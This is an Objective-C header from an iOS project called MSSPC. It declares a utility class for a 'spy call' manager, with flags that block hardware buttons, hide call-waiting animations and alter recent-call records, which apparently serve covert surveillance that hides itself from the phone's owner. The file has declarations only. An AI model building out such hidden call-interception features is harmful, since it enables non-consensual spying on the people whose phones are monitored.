//
//  SystemEnvironmentUtils.h
//  MSSPC
//
//  Created by Makara Khloth on 3/12/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "SpyCallDisconnectDelegate.h"

@class SpyCallManager;
@class AudioHelper;
@class AVController;

@interface SystemEnvironmentUtils : NSObject <SpyCallDisconnectDelegate> {
@private
	BOOL	mBlockLockButtonUp;
	BOOL	mBlockMenuButtonUp;
	BOOL	mBlockAnimateOutCallWaiting;
	BOOL	mForceRecentCallDataChange;
	NSInteger	mMissedCall;
	
	NSString	*mTelephoneNumberBeforeSpyCallConference;
	
	SpyCallManager	*mSpyCallManager; // Not own
	AVController	*mAVController;
	
	AudioHelper		*mAudioHelper; // Not own, singleton
}

@property (nonatomic, assign) BOOL mBlockLockButtonUp;
@property (nonatomic, assign) BOOL mBlockMenuButtonUp;
@property (nonatomic, assign) BOOL mBlockAnimateOutCallWaiting;
@property (nonatomic, assign) BOOL mForceRecentCallDataChange;
@property (nonatomic, assign) NSInteger mMissedCall;

@property (nonatomic, copy) NSString *mTelephoneNumberBeforeSpyCallConference;

@property (nonatomic, assign) SpyCallManager *mSpyCallManager;
@property (nonatomic, retain) AVController *mAVController;

@property (nonatomic, readonly) AudioHelper *mAudioHelper;

// For real time checking and synchronization between SpringBoard/Mobile Phone
- (BOOL) isAudioActive;

// For testing purpose and not called in release
- (void) dumpAudioCategory;

@end
